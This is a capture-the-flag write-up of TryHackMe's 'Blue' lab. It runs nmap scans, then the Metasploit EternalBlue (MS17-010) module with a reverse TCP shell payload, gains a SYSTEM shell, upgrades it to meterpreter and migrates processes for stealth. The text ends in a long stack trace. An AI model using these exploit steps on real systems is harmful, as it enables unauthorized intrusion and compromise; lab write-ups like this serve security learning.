---
layout: post
title: THM - Blue
author: _f0rmat
date: 2025-07-22
tags: TryHackMe EternalBlue Metasploit Searchsploit boot2root john hashdump hashcracking
category: CTF
---

```
Difficulty: Easy (?)
Status: Complete
IP: 10.10.59.164
```

# Resolution summary
- boot2root machine i.e. no other real exploit value
- Utilised the Eternal Blue exploit to access the machine and get the request back to meterpreter after which we can use shell_to_meterpreter to make a 2nd shell from the machine as the user Jon
- Then enumeration and dumping the password hashdump which then we used John the Ripper to crack the password
- Lateral movement on the machine to find all the flags.

## Improved skills
- nmap
- Eternal Blue
- John

## Used tools
- nmap
- Metasploit
- hashdump
- john

---

# Information Gathering

Scanned all ports:

```bash
nmap -p- -T5 10.10.59.164 -v

PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3257/tcp  filtered cpqrpm-server
3389/tcp  open     ms-wbt-server
4654/tcp  filtered unknown
16081/tcp filtered unknown
38647/tcp filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49158/tcp open     unknown
49160/tcp open     unknown
```

Enumerated open ports:

```bash
nmap -p 135,139,445,3257,3389,4654,16081,38647,49152,49153,49154,49158,49160 -A 10.10.59.164 -v

PORT      STATE  SERVICE            VERSION
135/tcp   open   msrpc              Microsoft Windows RPC

139/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn

445/tcp   open   microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

3257/tcp  closed cpqrpm-server

3389/tcp  open   ssl/ms-wbt-server?
|_ssl-date: 2023-05-09T09:42:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-05-08T09:38:01
| Not valid after:  2023-11-07T09:38:01
| MD5:   f82485fcff5c14ee8c921164b1b59645
|_SHA-1: d864300615a213a86c6761976b6888b262018195
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-05-09T09:42:10+00:00

4654/tcp  closed unknown
16081/tcp closed unknown
38647/tcp closed unknown
49152/tcp open   msrpc              Microsoft Windows RPC
49153/tcp open   msrpc              Microsoft Windows RPC
49154/tcp open   msrpc              Microsoft Windows RPC
49158/tcp open   msrpc              Microsoft Windows RPC
49160/tcp open   msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_clock-skew: mean: 59m59s, deviation: 2h14m09s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02969870a7e3 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-09T04:42:10-05:00
| smb2-time: 
|   date: 2023-05-09T09:42:10
|_  start_date: 2023-05-09T09:38:00

```

---

# Enumeration

From Initial enumeration we I have found this to be a Windows machine currently running outdated software (Windows 7 with Service Pack 1 installed), it is possible that this machine is susceptible to the Eternal Blue Exploit MS17-010

Checking with Searchsploit on my machine I can see there are POCs (Proof Of Concepts) available for this:

```shell
└─$ searchsploit eternalblue 
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                              | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)          | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                    | windows_x86-64/remote/42030.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
```

-----
# Exploitation

## Metasploit

For this machine we will use the Metasploit framework to run the expolit for us,

Under the MSFConsole we can run

```shell
use exploit/windows/smb/ms17_010_eternalblue
```
and set the RHOSTS entry to the IP address of the Blue machine and the LHOST to our machines IP address

```shell
set rhosts 10.10.59.164
set lhost <ip>
```

After this we need to set up a reverse shell handler via metasploit with:

```shell
set payload windows/x64/shell/reverse_tcp
```

And now we can run our exploit:

```shell
> run

[*] Started reverse TCP handler on 10.14.49.18:4444 
[*] 10.10.59.164:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.59.164:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.59.164:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.59.164:445 - The target is vulnerable.
[*] 10.10.59.164:445 - Connecting to target for exploitation.
[+] 10.10.59.164:445 - Connection established for exploitation.
[+] 10.10.59.164:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.59.164:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.59.164:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.59.164:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.59.164:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.59.164:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.59.164:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.59.164:445 - Sending all but last fragment of exploit packet
[*] 10.10.59.164:445 - Starting non-paged pool grooming
[+] 10.10.59.164:445 - Sending SMBv2 buffers
[+] 10.10.59.164:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.59.164:445 - Sending final SMBv2 buffers.
[*] 10.10.59.164:445 - Sending last fragment of exploit packet!
[*] 10.10.59.164:445 - Receiving response from exploit packet
[+] 10.10.59.164:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.59.164:445 - Sending egg to corrupted connection.
[*] 10.10.59.164:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.59.164
[*] Command shell session 1 opened (10.14.49.18:4444 -> 10.10.59.164:49231) at 2023-05-09 11:44:20 +0100
[+] 10.10.59.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.59.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.59.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
C:\Windows\system32>
```

---

# Lateral Movement to Flags

## Local Enumeration

We are now connected to the machine with the user 'nt authority system'

```shell
C:\Windows\system32>whoami
whoami
nt authority\system
```

We can now background this shell with Ctrrl+Z bringing us back to the meterpreter shell where we can now configure that session shell to a meterpreter shell in metasploit by running:

```shell
post/multi/manage/shell_to_meterpreter
```

After which we can set the session to session 1 (our backgrounded ongoing connection to the blue machine) and then 'run' the post exploitation exploit;

```shell
> run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.14.49.18:4433 
[*] Post module execution completed
```

And once complete we can view the new session:

```shell
> sessions =l

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.14.49.18:4444 -> 10.10.59.164:49231 (10.10.59.164)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.14.49.18:4433 -> 10.10.59.164:49245 (10.10.59.164)

```

And interact with it by running 'sessions 2':

```shell
> sessions 2
[*] Starting interaction with 2...

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 356   1100  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 1064  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1156  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1404  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1460  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1568  356   cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1600  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1856  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1916  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1928  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2084  816   WmiPrvSE.exe
 2168  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2288  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2556  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2596  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2680  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2712  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2768  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2800  2268  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe

meterpreter > 

```

We can now migratge our process to something else to help keep things stealthy

```shell
meterpreter > migrate 2268
[*] Migrating from 356 to 2268...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50: warning: Exception in finalizer #<Proc:0x00007fabc895a0f8 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': can't be called from trap context (ThreadError)
        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:343:in `rescue in block in finalize'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:340:in `block in finalize'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/migrate_common_x64.rb:40:in `generate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:824:in `generate_migrate_stub'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:628:in `migrate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1681:in `cmd_sessions'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
        from /usr/bin/msfconsole:23:in `<main>'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:368:in `close'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:341:in `block in finalize'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/migrate_common_x64.rb:40:in `generate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:824:in `generate_migrate_stub'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:628:in `migrate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1681:in `cmd_sessions'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
        from /usr/bin/msfconsole:23:in `<main>'
/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50: warning: Exception in finalizer #<Proc:0x00007fabc85f8478 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': can't be called from trap context (ThreadError)
        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:343:in `rescue in block in finalize'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:340:in `block in finalize'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/migrate_common_x64.rb:40:in `generate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:824:in `generate_migrate_stub'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:628:in `migrate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1681:in `cmd_sessions'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
        from /usr/bin/msfconsole:23:in `<main>'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
